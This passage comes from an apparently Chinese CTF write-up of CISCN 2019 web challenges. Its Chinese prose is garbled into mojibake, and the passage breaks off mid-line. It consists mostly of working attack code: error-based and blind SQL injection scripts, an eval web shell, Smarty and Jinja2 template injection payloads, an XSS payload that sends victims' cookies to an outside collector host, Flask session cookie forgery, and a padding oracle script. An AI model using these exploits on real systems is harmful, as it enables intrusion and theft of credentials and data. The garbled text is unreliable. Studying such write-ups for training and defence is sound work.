`address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];        $result = $db-&gt;query($sql);        if(!$result) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;</code></pre><p>å›æ˜¾ä»¥<code>error</code>çš„å½¢å¼è¢«æ‰“å°å‡ºæ¥ï¼Œè¯æ˜æˆ‘ä»¬éœ€è¦ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚<br>å…·ä½“å½¢å¼æ˜¯ï¼Œæˆ‘ä»¬æäº¤å§“åï¼Œç”µè¯ï¼Œåœ°å€ä¸‰ä¸ªå‚æ•°ï¼Œå¹¶åœ¨åœ°å€ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚ä¹‹ååœ¨change.phpå†æ¬¡æäº¤ç›¸åŒå§“åç”µè¯ä¸éšä¾¿å†™åœ°å€ï¼Œå³å¯è§¦å‘<code>update</code>æ‰§è¡ŒæŠ¥é”™æ³¨å…¥ã€‚æ ¹æ®updateè¯­å¥æ„é€ payload:</p><pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</code></pre><p>è²Œä¼¼é¢˜ç›®flagä¸åœ¨åº“é‡Œï¼Œçœ‹wpå‘ç°æ˜¯/flag.txtã€‚æœ‰ç‚¹è¿·æƒ‘ã€‚éœ€è¦æ³¨æ„æŠ¥é”™æ³¨å…¥å­—æ®µæ•°çš„é™åˆ¶ï¼Œè°ƒæ•´<code>substr()</code>çš„åä¸¤ä¸ªå‚æ•°ã€‚</p><h1 id="Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰"><a href="#Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰" class="headerlink" title="Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰"></a>Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰</h1><p>å¼€å§‹ä»robots.txtå¾—åˆ°çš„image.php.bakçš„æºç æ³„éœ²ä¿¡æ¯</p><pre><code class="php">&lt;ï»¿?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#39;{$id}&#39; or path=&#39;{$path}&#39;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);</code></pre><p>å‘ç°æœ‰sqlæ³¨å…¥ç‚¹ï¼Œä¸»è¦è¦åº”å¯¹ä¸¤ä¸ªå‚æ•°çš„è¿‡æ»¤</p><pre><code>$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);</code></pre><p>è€ƒè™‘ä½¿ç”¨<code>\0</code>ï¼Œå¹¶åœ¨pathä¸­æ³¨å…¥ã€‚è¿™æ ·æˆ‘ä»¬çš„sqlè¯­å¥å°±å˜æˆäº†:</p><pre><code>select * from images where id=&#39; or path=&#39; or 1=1#</code></pre><p>å‰©ä¸‹çš„å¸ƒå°”ç›²æ³¨å³å¯</p><pre><code class="python">import requestsflag=&#39;&#39;for i in range(1,50):    a=0    print(i)#ciscnfinal, images,users    for j in range(32, 128):#select group_concat(column_name) from information_schema.columns where table_name=database()        #url = &quot;http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,1,0)%23&quot;        url = &quot;http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20id=if(ascii(substr((select group_concat(password) from users),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,1,0)%23&quot;        res = requests.get(url)        if &#39;JFIF&#39; in res.text:            flag += chr(j)            print(flag)            a = 1            break    if a==0:        break</code></pre><p>æ³¨å…¥å¾—åˆ°usernameä¸passwordç™»å½•è¿›å…¥åå°ã€‚å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚ç®€å•fuzzä¸‹å‘ç°æ–‡ä»¶åä¼šè¢«å­˜å‚¨åˆ°å›ºå®šphpæ—¥å¿—æ–‡ä»¶ä¸­<code>logs/upload.b888aaa68e9659c297c4b02084157cff.log.php</code><br>æ—¢ç„¶å¦‚æ­¤åªéœ€ä¸Šä¼ ä¸€å¥è¯ã€‚å‘ç°phpå…³é”®å­—è¢«æ‹¦ã€‚<br>ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š</p><pre><code class="php">&lt;?=@eval($_GET[&#39;byc&#39;]);?&gt;</code></pre><p>è¿™æ˜¯å› ä¸º</p><pre><code>//php.iniä¸­short_open_tag = On//é™¤&lt;?php ?&gt;ï¼Œå¯ä½¿ç”¨æ›´çµæ´»çš„è°ƒç”¨æ–¹æ³•&lt;? /*ç¨‹åºæ“ä½œ*/ ?&gt;&lt;?=/*å‡½æ•°*/?&gt;</code></pre><p>bypassæ‰åæ‰§è¡Œå‘½ä»¤<code>system(&#39;cat /flag&#39;);</code>å³å¯</p><h1 id="åä¸œå—èµ›åŒº-Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰"><a href="#åä¸œå—èµ›åŒº-Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰" class="headerlink" title="åä¸œå—èµ›åŒº Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰"></a>åä¸œå—èµ›åŒº Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰</h1><p>è¿™é¢˜å¼€å§‹çœ‹çš„æˆ‘è´¼å¥‡æ€ªï¼Œå› ä¸ºæ•´ä¸ªç½‘ç«™è²Œä¼¼åªæ˜¯ä¸€ä¸ªapiæ¥å£ã€‚å…¶ä¸­å›æ˜¾æœ‰ä¸€éƒ¨åˆ†ååˆ†æ˜¾çœ¼<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="xff"><br>å¼€å§‹è€ƒè™‘æ˜¯å¦å­˜åœ¨å…³äºxffå¤´çš„ä¿¡æ¯ã€‚ä½†æ˜¯æ²¡æµ‹å‡ºæ¥ã€‚å»ç½‘ä¸Šæœäº†æ³¢wpæç„¶å¤§æ‚Ÿã€‚åŸæ¥å…³é”®ç‚¹åœ¨ç½‘é¡µä¸‹æ–¹æç¤ºçš„<code>Build With Smarty !</code><br>Smartyæ˜¯ä¸€ç§phpç½‘é¡µå¼•æ“ï¼Œä¹Ÿå­˜åœ¨å¦‚pythonjinja2çš„sstiæ³¨å…¥ã€‚</p><p>åŒæ—¶å…¶ä½¿ç”¨æ–¹æ³•å¦‚<code>{if cmd}{/if}</code>å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚<br>æ‰€ä»¥é¦–å…ˆbpé‡Œæ›´æ”¹xffåŒ…ï¼Œå°è¯•2,å‘ç°æ³¨å…¥æˆåŠŸï¼›<br>ä¹‹åç›´æ¥ä»»æ„å‘½ä»¤æ‰§è¡Œå³å¯æ‹¿åˆ°flag</p><pre><code>{file_get_contents(&#39;/flag&#39;)}</code></pre><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag4.PNG" class="lazyload" data-srcset="flag4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="åä¸œåŒ—èµ›åŒº-Web2ï¼ˆå­˜å‚¨å‹xss-sqlæ³¨å…¥ï¼‰"><a href="#åä¸œåŒ—èµ›åŒº-Web2ï¼ˆå­˜å‚¨å‹xss-sqlæ³¨å…¥ï¼‰" class="headerlink" title="åä¸œåŒ—èµ›åŒº Web2ï¼ˆå­˜å‚¨å‹xss+sqlæ³¨å…¥ï¼‰"></a>åä¸œåŒ—èµ›åŒº Web2ï¼ˆå­˜å‚¨å‹xss+sqlæ³¨å…¥ï¼‰</h1><p>é¢˜ç›®ç®—æ˜¯æ¯”è¾ƒä¼ ç»Ÿçš„xssè§¦å‘æ¨¡å¼äº†ã€‚æ³¨å†Œç™»å½•åä¸€ä¸ªè¾“å…¥æ¡†å…è®¸æˆ‘ä»¬ä½¿ç”¨xsspayloadï¼Œè¿˜æœ‰ä¸€ä¸ªç•Œé¢è¾“å…¥éªŒè¯ç åè§¦å‘boté˜…è¯»ã€‚æˆ‘ä»¬ç›®æ ‡å°±æ˜¯æ‰“åˆ°adminçš„cookieã€‚</p><p>é¦–å…ˆå°è¯•æ€§å¼¹ä¸ªçª—ï¼Œç»“æœåœ¨é¡µé¢é‡Œçœ‹åˆ°ä¸ªè‡ªå·±æœ‰å¿ƒç†é˜´å½±çš„CSPé™åˆ¶ã€‚</p><pre><code class="javascript">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;&quot;&gt;</code></pre><p>å¥½åœ¨cspè§„åˆ™ä¸ç®—æ¯”è¾ƒä¸¥æ ¼ã€‚å› ä¸º<code>&#39;unsafe-inline&#39; &#39;unsafe-eval&#39;</code>å…è®¸æˆ‘ä»¬åŠ è½½ä¸€æ®µå†…è”jsä»£ç æ‰§è¡Œã€‚è€Œè§£å†³è¿™ä¸ªçš„åŠæ³•åªéœ€ä½¿ç”¨<code>window.location.href</code>å°±å¯ç»•è¿‡ã€‚è¿™é‡Œå› ä¸ºæœ‰buuojæä¾›çš„xsså¹³å°ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ç”Ÿæˆçš„ä»£ç æ‰“ä¸€æ‰“çœ‹çœ‹ã€‚å‘ç°æœ‰è¿‡æ»¤ä¸è½¬æ¢ï¼Œä¼°è®¡å¾—å®ä½“ç¼–ç ç»•è¿‡ã€‚<br>æŠŠxsså¹³å°ç”Ÿæˆçš„payloadæ”¹æˆå®ä½“ç¼–ç ï¼š(æ³¨æ„idå€¼æ˜¯ç”Ÿæˆä»£ç é‡Œçš„idï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯é¡¹ç›®åidåŠå¤©æ‰“ä¸åˆ°)</p><pre><code class="javascript">(function(){window.location.href=&#39;http://ip:port/index.php?do=api&amp;id=ex0I6K&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return &#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return &#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return &#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return &#39;&#39;}})());})();</code></pre><pre><code class="javascript">&lt;svg&gt;&lt;script&gt;å®ä½“ç¼–ç payload&lt;/script&gt;</code></pre><p>æäº¤åè®¿é—®é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°å¹³å°æ˜¯èƒ½æ”¶åˆ°cookieçš„ï¼Œé‚£å°±ä¸éœ€è¦å…³å¿ƒå…¶ä»–çš„ï¼Œç›´æ¥å»åé¦ˆé¡µé¢è·‘æ®µè„šæœ¬çˆ†ç ´éªŒè¯ç æäº¤å³å¯ã€‚ç­‰å¾…botç‚¹å‡»é¡µé¢ï¼Œä¹‹åå¹³å°æ”¶åˆ°cookie<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="cookie"><br>ä¿®æ”¹ç™»å½•è¿›å…¥admin.phpåå°ï¼Œä¸€ä¸ªæ˜æ˜¾çš„sqlæ³¨å…¥ç›´æ¥è”åˆæŸ¥è¯¢å³å¯ã€‚3ä¸ªå­—æ®µï¼Œå›æ˜¾ç¬¬2,3ä¸ª<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag5.PNG" class="lazyload" data-srcset="flag5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="double-secrect-ssti"><a href="#double-secrect-ssti" class="headerlink" title="double secrect (ssti)"></a>double secrect (ssti)</h1><p>åŸºæœ¬ä¸Šå”¬äººçš„æˆåˆ†æ¯”è¾ƒå¤§ã€‚å› ä¸ºä¸€å¼€å§‹è¿›å…¥é¢˜ç›®åªæœ‰ä¸€å¥<code>Welcome To Find Secret</code>ï¼Œä¹‹åè®¿é—®robots.txtå‘ç°å±…ç„¶æŠ¥this is android ctfï¼Œè®©æˆ‘ä»¥ä¸ºçœ‹é”™é¢˜äº†ã€‚ä½†å…¶å®è®¿é—®secretè·¯ç”±å¹¶ä¼ å‚secretæ—¶ï¼Œå‘ç°ä¼šæœ‰å›æ˜¾ã€‚å½“å›æ˜¾å­—æ•°å¤šçš„æ—¶å€™å‡ºç°pythonæŠ¥é”™ï¼Œå¯ä»¥çŒœæµ‹æ˜¯sstiã€‚è¿™é‡Œæˆ‘å°è¯•ç›´æ¥ä¼ ä¸€æ®µä¸­æ–‡ï¼Œå…¶å®asciiç æ¯”è¾ƒå¤§çš„æ–‡å­—ä¹Ÿä¼šè§¦å‘æŠ¥é”™ï¼Œçˆ†å‡ºé‡è¦æºç ï¼š<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="RC4"></p><p>åŸæ¥æ˜¯æ®µåŠ å¯†ï¼Œè€Œä¸”çˆ†å‡ºçš„æºç è¿keyå€¼éƒ½ç»™äº†ã€‚é‚£ä¹ˆç›´æ¥RC4åŠ å¯†æˆ‘ä»¬çš„ssti payloadåŸºæœ¬å°±å®Œäº‹äº†ã€‚<br>exp:</p><pre><code class="python">import requestsimport urllibclass RC4:    def __init__(self, key):        self.key = key        self.key_length = len(key)        self._init_S_box()    def _init_S_box(self):        self.Box = [i for i in range(256)]        k = [self.key[i % self.key_length] for i in range(256)]        j = 0        for i in range(256):            j = (j + self.Box[i] + ord(k[i])) % 256            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]    def crypt(self, plaintext):        i = 0        j = 0        result = &#39;&#39;        for ch in plaintext:            i = (i + 1) % 256            j = (j + self.Box[i]) % 256            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]            t = (self.Box[i] + self.Box[j]) % 256            result += chr(self.Box[t] ^ ord(ch))        return resulturl=&#39;http://7318e5d2-ecf4-4961-b115-4f1eb3b11c4a.node3.buuoj.cn/secret?secret=&#39;a = RC4(&#39;HereIsTreasure&#39;)cmd=&quot;{{''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()}}&quot;payload = urllib.parse.quote(a.crypt(cmd))res = requests.get(url + payload)print(res.text)</code></pre><h1 id="åä¸œå—èµ›åŒº-Web4-flask-session-cookieä¼ªé€ "><a href="#åä¸œå—èµ›åŒº-Web4-flask-session-cookieä¼ªé€ " class="headerlink" title="åä¸œå—èµ›åŒº Web4 (flask session cookieä¼ªé€ )"></a>åä¸œå—èµ›åŒº Web4 (flask session cookieä¼ªé€ )</h1><p>è¢«æ²¡å¿…è¦çš„æƒ…å†µç»™æµªè´¹äº†æ—¶é—´â€¦â€¦ä¸»è¦æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œå¿ƒé‡Œè‹¦å•Šã€‚<br>é¦–å…ˆé¢˜ç›®ç»™äº†ä¸€ä¸ªå‚æ•°å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œç”±äºè·¯ç”±åç§°ï¼Œå…ˆçœ‹ä¸‹æºç app.py</p><pre><code class="python"># encoding:utf-8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233) app.debug = True @app.route(&#39;/&#39;) def index():     session[&#39;username&#39;] = &#39;www-data&#39;     return &#39;Hello World! Read somethings&#39; @app.route(&#39;/read&#39;) def read():     try: url = request.args.get(&#39;url&#39;)          m = re.findall(&#39;^file.*&#39;, url, re.IGNORECASE)          n = re.findall(&#39;flag&#39;, url, re.IGNORECASE)          if m or n: return &#39;No Hack&#39;             res = urllib.urlopen(url)             return res.read()     except Exception as ex:         print str(ex)         return &#39;no response&#39; @app.route(&#39;/flag&#39;) def flag():     if session and session[&#39;username&#39;] == &#39;fuck&#39;:         return open(&#39;/flag.txt&#39;).read()     else:         return &#39;Access denied&#39; if __name__==&#39;__main__&#39;:     app.run( debug=True, host=&quot;0.0.0.0&quot; )</code></pre><p>å¯ä»¥çœ‹åˆ°åªè¦ä¼ªé€ <code>session[&#39;username&#39;]</code>çš„å€¼å°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚ç”±äºè¿™é‡Œçš„éšæœºæ•°ç§å­<code>SECRECT_KEY</code>å¾ˆè½»æ¾å°±å¯ä»¥ä¼ªé€ ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šè„šæœ¬çˆ†ç ´å¹¶ç”Ÿæˆcookieå€¼</p><pre><code class="python">import flask_session_cookie_manager2import randommac = &quot;02:42:ae:00:d0:09&quot;random.seed(int(mac.replace(&quot;:&quot;, &quot;&quot;), 16))for x in range(1000):    key = str(random.random() * 233)    result = flask_session_cookie_manager2.FSCM.decode(&#39;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XljQxQ.zBqq36UiMEIrykW9oqSlvg4wBkw&#39;, key)    if &#39;error&#39; not in result:        result[u&#39;username&#39;] = &#39;fuck&#39;        print flask_session_cookie_manager2.FSCM.encode(key, str(result))        exit()</code></pre><p>ç†è®ºä¸Šæ”¹cookieå°±å®Œäº‹äº†ï¼Œä½†æ˜¯æˆ‘ç™½èŠ±äº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œå› ä¸ºè™šæ‹Ÿæœºçš„py2çš„ç¯å¢ƒæœ‰é—®é¢˜ã€‚æœŸé—´è¿˜å‘ç°ï¼ŒåŸæ¥å‚æ•°ä¸å˜æ—¶ç”Ÿæˆçš„cookieä¹Ÿä¼šå› ä¸ºæ—¶é—´åŸå› è€Œä¸åŒã€‚<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ä¸åŒçš„æ—¶é—´æˆ³å¯¼è‡´å€¼ä¸åŒ"><br>å½“ç„¶è¿™å¹¶ä¸å½±å“ç»“æœã€‚åªè¦æ˜¯python2ç†è®ºä¸Šå°±æ²¡æœ‰é—®é¢˜ã€‚<br>æœ€åè¿˜æ˜¯åœ¨vpsä¸Šè·‘çš„è„šæœ¬æ‰æ‹¿åˆ°flagâ€¦â€¦</p><h1 id="PointSystem-PaddingOracle-cbcç¿»è½¬"><a href="#PointSystem-PaddingOracle-cbcç¿»è½¬" class="headerlink" title="PointSystem(PaddingOracle+cbcç¿»è½¬)"></a>PointSystem(PaddingOracle+cbcç¿»è½¬)</h1><p>é¢˜ç›®éš¾åº¦æŒºå¤§çš„ï¼Œå‰åè¿˜æ‹–äº†ä¸å°‘æ—¶é—´ï¼Œæœ€åå‚è€ƒäº†å‡ºé¢˜äººèµµå¸ˆå‚…çš„wpæ‰å‹‰å¼ºå†™å‡ºæ¥çš„ã€‚å…¶ä¸­æ¶‰åŠPaddingOracle+CBCç¿»è½¬æ”»å‡»çš„çŸ¥è¯†æ¶‰åŠå¯†ç å­¦ï¼Œè‡ªå·±æ‰€çŸ¥ç”šå°‘ï¼ŒåŸæ¥ä¹Ÿåªå¥—è¿‡è„šæœ¬åšè¿‡ä¸€é“paddingoracleçš„é¢˜ç›®ã€‚æ‰€ä»¥å…ˆæŠŠè§£é¢˜è¿‡ç¨‹æ”¾ä¸€ä¸‹ï¼ŒæŠ½ç©ºæŠŠpadding oracleç­‰ç­‰åŠ å¯†åŸç†ç†è§£ä¸‹ã€‚</p><p>é¦–å…ˆé¢˜ç›®ä»robots.txtä¸­è·å–ä¿¡æ¯ï¼Œè¿›å…¥<code>swagger-ui.html</code>ï¼Œå¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šapiæ¥å£çš„ä½¿ç”¨ã€‚<img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="api"><br>ä¸€å¼€å§‹å°è¯•èƒ½å¦ç›´æ¥åœ¨è¿™ä¸ªç•Œé¢è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ¯”å¦‚æ³¨å†Œæˆ–è€…pingä¹‹ç±»çš„ã€‚ä½†æ˜¯å‘ç°å¹¶ä¸å¯è¡Œã€‚ä¸è¿‡æˆ‘ä»¬æ—¢ç„¶çŸ¥é“æœ‰æ³¨å†Œæ¥å£ï¼Œç›´æ¥æŒ‰ç…§æ ¼å¼åˆ©ç”¨æ¥å£æ³¨å†Œä¸€ä¸ªè´¦å·å°±å¥½äº†ã€‚<br>æ³¨å†Œåå°è¯•ç™»å½•ï¼Œå´æ„å¤–å‘ç°å­˜åœ¨æƒé™ä¸å¤Ÿçš„é—®é¢˜ã€‚</p><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æƒé™"><br>ä½†æ˜¯åœ¨burpsuiteä¸­æ„å¤–å‘ç°äº†é™¤äº†ä¸€ä¸ªç™»å½•çš„poståŒ…ï¼Œè¿˜æœ‰ä¸€ä¸ªgetè¯·æ±‚äº†æœªçŸ¥çš„apiå¹¶è¿”å›ä¿¡æ¯ã€‚<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="info"><br>å°†ç™»å½•æ‰€è¿”å›çš„ä¸€æ®µbase64è¿›è¡Œè§£ç å¾—åˆ°ï¼š</p><pre><code class="json">{&quot;signed_key&quot;:&quot;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZOzOMzVHlzkkVTuw8vkgQOwMZ2B5Leaq0Gc+rzoKtQdjsiMrpsSBq/QvWKTHYKxBHN0JzlQd6bXhFdSUa4slA7g==&quot;,&quot;role&quot;:3,&quot;user_id&quot;:1,&quot;payload&quot;:&quot;CHAkpjTggDemZY7gzXBvbR2WeXJ47cfj&quot;,&quot;expire_in&quot;:1582905111}</code></pre><p>è€Œå‰é¢çš„<code>signed_key</code>ä¹Ÿè¿›è¡Œbase64è§£ç çš„è¯ï¼Œä¼šå‘ç°å†…å®¹ç”±æ˜æ–‡+å¯†æ–‡ç»„åˆèµ·æ¥äº†ã€‚è¯´æ˜æœ‰å¯èƒ½æœåŠ¡å™¨é‡‡å–cbcæ¨¡å¼åŠ å¯†ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯paddingoracleç ´è§£å‡ºç»“æ„å¹¶cbcç¿»è½¬ä¸€ä¸‹ã€‚<br>padding oracleexp:</p><pre><code class="python">import timeimport requestsimport base64import jsonhost = &quot;d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn&quot;def padding_oracle(key):    user_key_decode = base64.b64decode(key)    user_key_json_decode = json.loads(user_key_decode)    signed_key = user_key_json_decode[&#39;signed_key&#39;]    signed_key_decoded = base64.b64decode(signed_key)    url = &quot;http://&quot; + host + &quot;/frontend/api/v1/user/info&quot;    N = 16    total_plain = &#39;&#39;    for block in range(0, len(signed_key_decoded) // 16 - 1):        print(block)        token = &#39;&#39;        get = b&quot;&quot;        cipher = signed_key_decoded[16 + block * 16:32 + block * 16]        for i in range(1, N+1):            for j in range(0, 256):                time.sleep(0.2)                padding = b&quot;&quot;.join([(get[n] ^ i).to_bytes(1, &#39;little&#39;) for n in range(len(get))])                c = b&#39;\x00&#39; * (16 - i) + j.to_bytes(1, &#39;little&#39;) + padding + cipher                #print(c)                token = base64.b64encode(c)                user_key_json_decode[&#39;signed_key&#39;] = token.decode(&quot;utf-8&quot;)                header = {&#39;Key&#39;: base64.b64encode(bytes(json.dumps(user_key_json_decode), &quot;utf-8&quot;))}                res = requests.get(url, headers=header)                if &#39;å°‘å¥³&#39; in res.text:                    print(&#39;404 error occured!&#39;)                    time.sleep(15.0)                    res = requests.get(url, headers=header)                if res.json()[&#39;code&#39;] == 206:                    get = (j ^ i).to_bytes(1, &#39;little&#39;) + get                    print(i,get)                    break        plain = b&quot;&quot;.join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, &#39;little&#39;) for i in range(N)])        print(plain.decode(&quot;utf-8&quot;), &quot;block=%d&quot; % block)        total_plain += plain.decode(&quot;utf-8&quot;)        print(total_plain)    return total_plainplain_text = 